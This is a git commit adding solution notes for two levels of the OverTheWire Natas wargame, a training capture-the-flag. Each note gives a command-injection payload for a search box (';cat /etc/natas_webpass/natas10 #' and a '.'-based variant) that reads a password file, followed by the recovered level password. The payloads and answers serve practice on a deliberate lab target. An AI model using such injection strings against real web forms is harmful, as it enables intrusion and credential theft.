8e7a9adc261e3934e699c7920ef87a54a287de79
AndreMarcos <andre92marcos@gmail.com>
2020-10-08 15:56:04 +0100

    level10 to 11

---
+++ challenges/overthewire/wargames/natas/level10/run.sh
@@ -0,0 +1,3 @@
+#the input of the textbox is gonna be passed to a grep that searches a dict so jus pass
+# ;cat /etc/natas_webpass/natas10 #
+#nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
---
+++ challenges/overthewire/wargames/natas/level11/run.sh
@@ -0,0 +1,3 @@
+#similar as the previous level but now we can use . in the beginning of the command since it is not filtered
+#. /etc/natas_webpass/natas11 #
+#U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
